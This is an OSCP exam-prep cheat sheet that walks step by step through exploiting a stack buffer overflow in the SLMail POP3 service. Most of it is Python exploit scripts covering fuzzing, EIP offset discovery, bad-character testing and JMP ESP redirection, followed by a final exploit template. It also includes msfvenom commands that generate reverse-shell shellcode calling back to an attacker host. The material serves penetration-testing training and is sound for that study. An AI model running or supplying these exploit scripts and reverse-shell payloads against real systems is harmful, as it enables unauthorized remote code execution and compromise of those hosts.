---
title: Buffer Overflow
date: 2020-06-26 18:32:04
tags: [oscp, cheatsheet]
---

# Windows 32-Bit Buffer Overflow
SLMail Example

Practice these:
- [ ] SLMail - download from [exploit-db](https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe)
- [ ] Brainpan - download from [vulnhub](https://www.vulnhub.com/entry/brainpan-1,51/)

## Step By Step Scripts
All the scripts are available [here](https://github.com/krnb/scripts/tree/master/bof) as well as at the <a onclick="go_bottom()" style="cursor: pointer; ">bottom</a>.

### connect.py

Making sure connection and all the operations are successfully performed is crucial as everything will be built on this script/step.

``` python
import socket
import sys

rhost = "192.168."
rport = 110


try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	print s.recv(1024)
	s.send('USER test\r\n')
	print s.recv(1024)
	s.send('PASS asdf\r\n')
	print s.recv(1024)
	s.send('QUIT\r\n')
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()
```

### fuzzer.py

Once you're successfully able to connect to the service, can perform authentication, and quit gracefully, it's time to fuzz.

``` python
import socket
import sys

rhost = "192.168"
rport = 110

payload = ""
payload += "A" * 100

while True:
	try:
		print "Fuzzing with %s bytes..." % len(payload)
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((rhost,rport))
		s.recv(1024)
		s.send("USER test\r\n")
		s.recv(1024)
		s.send("PASS " + payload + "\r\n")
		s.recv(1024)
		s.send("QUIT")
		s.close()
		payload += "A"*100
	except:
		print "Oops! Something went wrong!"
		print "Fuzzing crashed at %s bytes" % len(payload)
		sys.exit()
```

### getoffset.py

Once the application is fuzzed at X, lets say 2700, bytes, create a unique string of X+200 (or 300) bytes, let's say 3000 bytes, using `msf-pattern_create` like below:

```
msf-pattern_create -l 3000
```

Assign this unique string to the payload variable

```python
import socket
import sys

rhost = "192.168"
rport = 110

payload = ""
payload += "PASS "
payload += "<enter unique string here>"
payload += "\r\n"

try:
	print "Overflowing with %s bytes..." % len(payload)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.recv(1024)
	s.send("QUIT")
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()
```

Make a note of the address that the EIP was overwriten with, use `msf-pattern_offset` to find the offset, like below:

```
msf-pattern_offset -l 3000 -q <enter EIP address>
```

This will provide you with the offset at which the EIP will be written at. If the offset is 2606, then that means from byte 2607 to byte 2610 will determine the EIP address, and the rest will go into ESP.

### controleip.py

Next step is to ensure the offset we received is actually right. To do so, we'll put 4 "B"s from byte 2607 till byte 2610. 

``` python
import socket
import sys

rhost = "192.168"
rport = 110

# Total payload size to be sent, 
size = 3200
payload = "A"*2606+"B"*4
payload += "C"*(size - len(payload))

request = ""
request += "PASS "
request += payload
request += "\r\n"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(request)
	s.recv(1024)
	s.send("QUIT")
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()
```

If the application crashes with EIP with the address : `42424242`, which is hex for `BBBB`, we'll move on to the next step

### badchar.py

Finding bad characters is an iterating process. You will be sending characters from 0x01 to 0xff, and upon countering a character that *breaks* or is *escaped* by the application, that character is removed from the character array and the process is repeated. Bad characters aren't necessarily just the null byte (0x00), newline (\n - 0x0a), and carriage return (\r - 0x0d).

**Take a good 20 minutes, sit down, and identify each and every bad character**

To know what hex is which character - `man ascii` or [asciitables website](http://www.asciitable.com/)

``` python
import socket
import sys


rhost="192.168"
rport=110

size = 3200
payload = ""
payload += "PASS "
payload += "A"*2606

# Bad chars identified - 0x00
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload += badchars
payload += "D"*(size-len(payload))
payload += "\r\n"

try:
	print "Testing bad chars..."
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()
```

### Finding JMP Pointer

Once all the bad characters are found, we'll find the JMP ESP pointer from the Immunity Debugger itself using mona. Since I am using SLMail as my example, the bad characters that I will be avoiding are - *0x00 0x0a 0x0d*  

``` c
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```

By executing the above command you will not only find the addresses, without protection mechanisms, that would perform JMP ESP but also ensure that none of the addresses has any of the bad characters in itself.

**Please ensure you select an address from the applications' DLL ONLY, and NOT from OS DLLs**. Application DLLs will be constant across operating systems, but we can NOT say the same for OS DLLs.

### jmpesp.py

Now that we have our EIP on our hand, let's see if we actually reach there and that it does go where we want it to.

In the Immunity Debugger, "go to" the address you selected and toggle breakpoint on.

``` python
import socket
import struct
import sys


rhost="19.168."
rport=110

size = 3200
ptr_jmp_esp = 0x5F4A358F

payload = ""
payload += "PASS "
payload += "A"*2606
payload += struct.pack("<I",ptr_jmp_esp) # Automatic little endian conversion
payload += "C"*(size-len(buff))
payload += "\r\n"

try:
	print "Gaining EIP..."
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()
```

Once we hit the breakpoint, first test is complete. Now let the application continue execution till return to ensure it actually goes in to the ESP.

### shelly.py

Now that we found the right address, and verified it. Let's get a reverse shell. I will be using a stageless shellcode since I have more than enough space to do so.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b "\x00\x0a\x0d" --var-name shellcode EXITFUNC=thread
```

The above command will generate a shellcode, but in python3 format, which I'm not using for now, so we will remove the "b"s in the front every line and then paste it in our exploit code.
By not specifying an encoder, msfvenom will automatically choose one on it's own, which is good.

``` python
import socket
import struct
import sys


rhost="192.168."
rport=110

size = 3200
# 5F4A358F   FFE4             JMP ESP
ptr_jmp_esp = 0x5F4A358F

payload = ""
payload += "PASS "
payload += "A"*2606
payload += struct.pack("<I",ptr_jmp_esp)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b "\x00\x0a\x0d" --var-name shellcode EXITFUNC=thread
<paste shellcode here>
nopsled = "\x90"*12 # Put appropriate number of nops

payload += nopsled
payload += shellcode
payload += "D"*(size - len(payload))
payload += "\r\n"

try:
	print "Sending evil code..."
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()
```

## EXAM GUIDE
### Steps
- [ ] Find offset
- [ ] Ensure control over EIP at found offset (4 B's)
- [ ] Find bad characters
- [ ] Find return address (JMP ESP)
- [ ] Ensure EIP overwrite (Breakpoint - F2 - at return address )
- [ ] Ensure buffer length for shellcode is good enough
- [ ] Get a shell

### Commands
``` bash
/usr/bin/msf-pattern_create -l 
/usr/bin/msf-pattern_offset -q

# avoid pointers with bad chars
# !mona jmp -r esp -cpb "\x00\x0a\x0d"
# try selecting an application specific DLL instead of OS
!mona jmp -r esp -cpb '\x00'

# Do	NOT	add an encoder by yourself, let msfvenom decide that
# [Recommended, reasons at the bottom] Stageless - use nc to connect to this shell 
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread

# Do	NOT	add an encoder by yourself, let msfvenom decide that
# Staged - use multi/handler to connect to this shell
msfvenom -p windows/shell/reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread
```

### cheatsheet.py
``` python
import socket
import struct
import sys

rhost = "192.168."
rport =

size = 3200

cmd = "PASS "

eip_offset = 

# Only select program DLL. Do  NOT  select OS DLL
ptr_jmp_esp = # JMP ESP - xxxx.dll

# Bad characters identified: \x00
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread
# Remove the "b" prefix from each line
shellcode = ""

payload = ""
payload += cmd
payload += "A"*eip_offset # padding
payload += struct.pack("<I",ptr_jmp_esp) # converting address to little endian
payload += "\x90"*16 # nopsled
payload += shellcode
payload += "D"*(size - len(payload)) # trialing padding
payload += "\r\n"

# Put a while loop to fuzz
# while True:
try:
	print "Sending evil payload..."
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.recv(1024)
	s.send("QUIT")
	s.close()
    # Fuzzing increment
	#payload += "A"
except:
	print "Oops! Something went wrong!"
	#print "Fuzzing crashed at %s bytes" % len(payload)
	sys.exit()
```

#### Why stageless
- Less the number of exploitation steps, the better
- More control over the shell execution process
- The stager that gets dropped in the staged shell, could be blocked or unable to execute for plethora of reasons unknown to you
	- It's more of a Metasploit thing, which could be one of the reasons it may get blocked 

#### Why staged
- Tried increasing the payload buffer but not enough space to fit a stageless shellcode

## Scripts Repo

All the scripts are available [here](https://github.com/krnb/scripts/tree/master/bof)